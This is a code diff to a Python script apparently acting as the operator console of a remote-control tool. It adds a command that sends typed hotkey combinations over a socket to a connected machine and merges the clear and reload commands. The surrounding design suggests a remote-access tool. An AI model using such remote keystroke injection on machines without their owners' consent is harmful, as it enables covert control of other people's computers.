@@ -77,10 +77,8 @@ def commandHQ():
 
         ans = False # Update github repo
 
-        if command == "clear" or command == "cl":
-            clear()
-            print(banner)
-            commandHQ()
+        if command == "clear" or command == "cl" or command == "reload" or command == "rl":
+            reload()
 
         if command == "1":
             try:
@@ -143,7 +141,19 @@ def commandHQ():
                 ans = True
             except:
                 reload()
-
+                
+        if command == "6":
+            try:
+                hotkey = input(format + "Enter hotkey: ")
+                hotkey = hotkey.split("+")
+                
+                message = str(["eh", hotkey])
+                message = message.encode()
+                
+                conn.send(message)
+                ans = True
+            except:
+                reload()
 
         if(ans == False): commandHQ()
 
@@ -166,6 +176,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
             if incoming_message[0] == "ol": # 5
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "eh": #6
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
